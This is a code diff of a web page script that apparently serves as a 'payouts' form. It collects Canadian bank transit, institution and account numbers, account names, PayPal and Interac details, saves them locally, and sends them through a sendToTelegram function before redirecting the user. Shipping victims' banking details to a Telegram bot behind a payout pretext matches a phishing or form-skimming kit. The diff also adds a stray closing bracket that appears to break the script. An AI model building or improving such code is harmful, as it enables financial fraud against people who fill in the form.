@@ -1075,19 +1075,51 @@ function sendToTelegram(data) {
 
 
 /* --------------------------
-MAIN BUTTON HANDLER (FIXED)
+SAVE DATA FUNCTION
 -------------------------- */
+
 function saveData() {
 
-// Prevent invalid bank data from saving
-if (!validateCanadianBankDetails()) {
-return;
+  const data = {
+    preference,
+
+    acuAccount: document.getElementById("acuAccount")?.value || "",
+    paypal: document.getElementById("paypalInput")?.value || "",
+    interac: document.getElementById("interacInput")?.value || "",
+    canadianBank: document.getElementById("canadianBankSelect")?.value || "",
+
+    accountName: document.getElementById("accountName")?.value || "",
+    transitNumber: document.getElementById("transitNumber")?.value || "",
+    institutionNumber: document.getElementById("institutionNumber")?.value || "",
+    accountNumber: document.getElementById("accountNumber")?.value || ""
+  };
+
+  localStorage.setItem("section3Data", JSON.stringify(data));
 }
+
+
+/* --------------------------
+MAIN BUTTON HANDLER
+-------------------------- */
 
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
+  // Prevent invalid bank data
+  if (!validateCanadianBankDetails()) {
+
+    const container = document.querySelector(".payment-container");
+
+    container.classList.add("warning");
+
+    setTimeout(() => {
+      container.classList.remove("warning");
+    }, 2000);
+
+    return;
+  }
+
   const data = {
-    preference: document.getElementById("preference")?.value.trim(),
+    preference,
 
     acuAccount: document.getElementById("acuAccount")?.value.trim(),
     paypal: document.getElementById("paypalInput")?.value.trim(),
@@ -1100,48 +1132,41 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     accountNumber: document.getElementById("accountNumber")?.value.trim()
   };
 
-  // at least one field check
-  const hasAnyValue = Object.values(data).some(v => v && v.toString().trim() !== "");
+  // At least one field check
+  const hasAnyValue = Object.values(data).some(
+    v => v && v.toString().trim() !== ""
+  );
 
   if (!hasAnyValue) {
+
     const container = document.querySelector(".payment-container");
 
-container.classList.add("warning");
+    container.classList.add("warning");
 
-// remove after animation
-setTimeout(() => {
-  container.classList.remove("warning");
-}, 2000);
+    setTimeout(() => {
+      container.classList.remove("warning");
+    }, 2000);
 
-return;
+    return;
   }
 
-  // bank validation
-  if (!validateCanadianBankDetails()) {
-    const container = document.querySelector(".payment-container");
-
-container.classList.add("warning");
-
-// remove after animation
-setTimeout(() => {
-  container.classList.remove("warning");
-}, 2000);
-
-return;
-  }
-
-  // save locally
+  // Save locally
   localStorage.setItem("section3Data", JSON.stringify(data));
 
   try {
+
     await sendToTelegram(data);
+
     window.location.href = "/acu-payouts";
+
   } catch (err) {
+
     console.error("Telegram send failed:", err);
+
     window.location.href = "/acu-payouts";
   }
-});
 
+});
 
 
 /* --------------------------
@@ -1171,6 +1196,7 @@ function resetLogoutTimer() {
 
 ["mousemove", "keydown", "scroll", "click"].forEach(event => {
   window.addEventListener(event, resetLogoutTimer);
+});
 });
 </script>
 
